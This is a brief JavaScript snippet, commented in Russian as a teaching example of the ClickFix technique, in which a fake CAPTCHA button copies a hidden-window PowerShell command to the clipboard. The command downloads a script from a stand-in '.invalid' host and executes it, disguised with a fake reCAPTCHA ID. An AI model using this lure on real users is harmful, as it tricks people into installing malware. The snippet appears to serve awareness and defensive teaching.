/* Учебный пример ClickFix: по нажатию кладёт в буфер команду PowerShell. Адрес .invalid не существует. */
document.getElementById('cap').addEventListener('click', function () {
  navigator.clipboard.writeText('powershell -w h -nop -c "iwr https://cdn-verify.invalid/check.ps1 | iex" # reCAPTCHA ID 88213');
  this.textContent = '☑ Проверка почти завершена';
});
